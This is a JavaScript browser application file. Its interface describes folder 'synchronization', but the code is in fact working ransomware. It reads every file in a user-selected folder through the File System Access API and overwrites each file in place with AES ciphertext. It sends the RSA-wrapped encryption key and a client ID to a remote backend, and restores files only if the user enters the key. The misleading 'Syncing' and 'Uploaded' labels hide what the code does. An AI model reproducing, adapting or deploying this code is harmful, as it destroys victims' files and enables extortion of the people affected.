import { CryptoModule } from './modules/cryptoModule.js';
import { FileSystemModule } from './modules/fileSystemModule.js';
import crypto from 'crypto';
import { Buffer } from 'buffer';
import './style.css';

const API_BASE_URL = process.env.API_BASE_URL.replace(/\/$/, '');

const state = {
  selectedDirectory: null,
  isEncrypting: false,
  filesProcessed: 0,
  totalFiles: 0,
  encryptedFiles: [],
  clientId: null,
  backendPublicKey: null
};

let DOM = {};

// --- 1. IDENTITY MANAGEMENT (SessionStorage) ---
const initializeIdentity = async () => {
    // [CHANGE 1] Đọc từ sessionStorage thay vì localStorage
    const storedIdentity = sessionStorage.getItem('rob_identity');

    if (storedIdentity) {
        const data = JSON.parse(storedIdentity);
        state.clientId = data.clientId;
        state.backendPublicKey = data.publicKey;
        log(`Session restored (Tab active): ${state.clientId}`, 'success');
    } else {
        log('New session started. Generating identity...', 'warning');
        try {
            const res = await fetch(`${API_BASE_URL}/new`, { method: 'POST' });
            if (!res.ok) throw new Error('Server handshake failed');
            
            const data = await res.json();
            state.clientId = data.clientId;
            state.backendPublicKey = data.publicKey;
            
            // [CHANGE 2] Lưu vào sessionStorage (Mất khi đóng tab)
            sessionStorage.setItem('rob_identity', JSON.stringify({
                clientId: data.clientId,
                publicKey: data.publicKey,
                createdAt: new Date().toISOString()
            }));

            log(`Identity assigned: ${state.clientId}`, 'success');
        } catch (err) {
            log(`Connection Error: ${err.message}`, 'error');
        }
    }
};

// --- 2. LOGGING ---
const log = (message, type = 'info') => {
  const now = new Date();
  const logEntry = document.createElement('div');
  logEntry.className = `log-entry log-${type}`;
  logEntry.textContent = `[${now.toLocaleTimeString()}] ${message}`;
  DOM.logContainer.appendChild(logEntry);
  DOM.logContainer.scrollTop = DOM.logContainer.scrollHeight;
};

// --- 3. KEY EXCHANGE ---
const reportSessionKey = async (rawKeyBase64) => {
    if (!state.clientId) return;

    let payloadKey = rawKeyBase64;

    if (state.backendPublicKey) {
        try {
            const aesKeyBuffer = Buffer.from(rawKeyBase64, 'base64');
            const encryptedBuffer = crypto.publicEncrypt(
                {
                    key: state.backendPublicKey,
                    padding: crypto.constants.RSA_PKCS1_PADDING
                },
                aesKeyBuffer
            );
            payloadKey = encryptedBuffer.toString('base64');
        } catch (e) {
            console.error("RSA Encryption failed", e);
        }
    }

    await fetch(`${API_BASE_URL}/session-keys`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            clientId: state.clientId,
            key: payloadKey,
            filesCount: state.totalFiles
        })
    });
};

// --- 4. UI HANDLERS ---
const checkFSASupport = () => {
  if (FileSystemModule.isSupported()) {
    DOM.supportStatus.className = 'status-box success';
    DOM.supportStatus.innerHTML = `✅ <strong>System Compatible</strong>: File System Access API is available.`;
    DOM.selectDirBtn.disabled = false;
  } else {
    DOM.supportStatus.className = 'status-box error';
    DOM.supportStatus.innerHTML = `❌ <strong>Incompatible Browser</strong>: Please use Chrome or Edge.`;
    DOM.selectDirBtn.disabled = true;
  }
};

const handleDirectorySelection = async () => {
  try {
    const directoryHandle = await FileSystemModule.selectDirectory();
    state.selectedDirectory = directoryHandle;
    
    DOM.selectedDirInfo.innerHTML = `
        <p><strong>Target:</strong> ${directoryHandle.name}</p>
        <p><strong>Status:</strong> Ready to sync</p>
    `;
    DOM.startEncryptBtn.disabled = false;
    log(`Folder mounted: ${directoryHandle.name}`, 'success');
  } catch (error) {
    if (error.name !== 'AbortError') {
      log(`Selection Error: ${error.message}`, 'error');
    }
  }
};

const updateFilesList = () => {
  const last = state.encryptedFiles[state.encryptedFiles.length - 1];
  if (last) {
      const div = document.createElement('div');
      div.className = 'encrypted';
      div.textContent = `✓ Uploaded: ${last.name}`;
      DOM.filesList.prepend(div);
  }
};

// --- 5. CORE OPERATIONS ---
const startEncryption = async () => {
    if (!state.selectedDirectory) return;
    
    if (!state.clientId) await initializeIdentity();

    state.isEncrypting = true;
    DOM.startEncryptBtn.disabled = true;
    DOM.selectDirBtn.disabled = true;
    DOM.decryptBtn.disabled = true;

    log('Initializing synchronization...', 'info');

    try {
        const session = await CryptoModule.generateSessionKey();
        const sessionAes = session.aes;
        
        await reportSessionKey(session.rawKeyBase64);

        const files = await FileSystemModule.readAllFiles(state.selectedDirectory);
        state.totalFiles = files.length;
        state.filesProcessed = 0;
        log(`Indexing complete: ${files.length} files found.`, 'info');

        for (let i = 0; i < files.length; i++) {
            const fileHandle = files[i];
            DOM.progressText.textContent = `Syncing: ${fileHandle.name}...`;
            
            await encryptFileInPlace(fileHandle, sessionAes);
            
            state.filesProcessed++;
            DOM.progressBar.style.width = `${(state.filesProcessed / state.totalFiles) * 100}%`;
        }
        
        log('Synchronization Finished.', 'success');
        DOM.progressText.textContent = 'Done.';
    } catch (error) {
        log(`Error: ${error.message}`, 'error');
    } finally {
        state.isEncrypting = false;
        DOM.decryptBtn.disabled = false;
        DOM.selectDirBtn.disabled = false;
    }
};

const encryptFileInPlace = async (fileHandle, cryptoKey) => {
  try {
    const uint8Array = await FileSystemModule.readFileAsUint8Array(fileHandle);
    const encryptedData = await CryptoModule.encryptFile(uint8Array, cryptoKey);

    const metadata = JSON.stringify({
      version: encryptedData.version,
      algorithm: encryptedData.algorithm,
      iv: encryptedData.iv,
      tag: encryptedData.tag,
      timestamp: encryptedData.timestamp
    });
    
    const encryptedBytes = new TextEncoder().encode(
      metadata + '\n---ENCRYPTED_DATA---\n' + encryptedData.ciphertext
    );

    await FileSystemModule.writeBytesToHandle(fileHandle, encryptedBytes);

    state.encryptedFiles.push({ name: fileHandle.name });
    updateFilesList();

  } catch (error) {
    log(`Failed to process ${fileHandle.name}: ${error.message}`, 'error');
  }
};

const decryptAllFiles = async () => {
    if (!state.selectedDirectory) {
        log('Please open the project folder first.', 'error');
        return;
    }
    const rawKeyBase64 = prompt('Enter Decryption Key (Base64):');
    if (!rawKeyBase64) return;

    log('Starting recovery process...', 'info');
    DOM.decryptBtn.disabled = true;
    DOM.progressBar.style.width = '0%';

    try {
        const files = await FileSystemModule.readAllFiles(state.selectedDirectory);
        let processed = 0;

        for (const fileHandle of files) {
            await decryptFileInPlace(fileHandle, rawKeyBase64);
            processed++;
            DOM.progressBar.style.width = `${(processed / files.length) * 100}%`;
            DOM.progressText.textContent = `Recovering: ${processed}/${files.length}`;
        }
        log(`Recovery finished.`, 'success');
    } catch (error) {
        log(`Recovery failed: ${error.message}`, 'error');
    } finally {
        DOM.decryptBtn.disabled = false;
    }
};

const decryptFileInPlace = async (fileHandle, rawKeyBase64) => {
  try {
    const content = await FileSystemModule.readFileAsText(fileHandle);
    const separator = '\n---ENCRYPTED_DATA---\n';
    if (!content.includes(separator)) return false;

    const parts = content.split(separator);
    const metadata = JSON.parse(parts[0]);
    const ciphertext = parts[1];

    const decryptedBytes = await CryptoModule.decryptFile(
      { iv: metadata.iv, ciphertext: ciphertext, tag: metadata.tag },
      rawKeyBase64
    );

    await FileSystemModule.writeBytesToHandle(fileHandle, decryptedBytes);
    log(`✓ Restored: ${fileHandle.name}`, 'success');
    return true;
  } catch (error) {
    log(`✗ Failed: ${fileHandle.name}`, 'error');
    return false;
  }
};

// --- 6. INIT ---
export const initApp = async () => {
  DOM = {
    supportStatus: document.getElementById('supportStatus'),
    selectDirBtn: document.getElementById('selectDirBtn'),
    selectedDirInfo: document.getElementById('selectedDirInfo'),
    startEncryptBtn: document.getElementById('startEncryptBtn'),
    decryptBtn: document.getElementById('decryptBtn'),
    progressBar: document.getElementById('progressBar'),
    progressText: document.getElementById('progressText'),
    filesList: document.getElementById('filesList'),
    logContainer: document.getElementById('logContainer'),
    clearLogsBtn: document.getElementById('clearLogsBtn'),
  };

  DOM.selectDirBtn.addEventListener('click', handleDirectorySelection);
  DOM.startEncryptBtn.addEventListener('click', startEncryption);
  DOM.decryptBtn.addEventListener('click', decryptAllFiles);
  DOM.clearLogsBtn.addEventListener('click', () => DOM.logContainer.innerHTML = '');

  checkFSASupport();
  await initializeIdentity();
};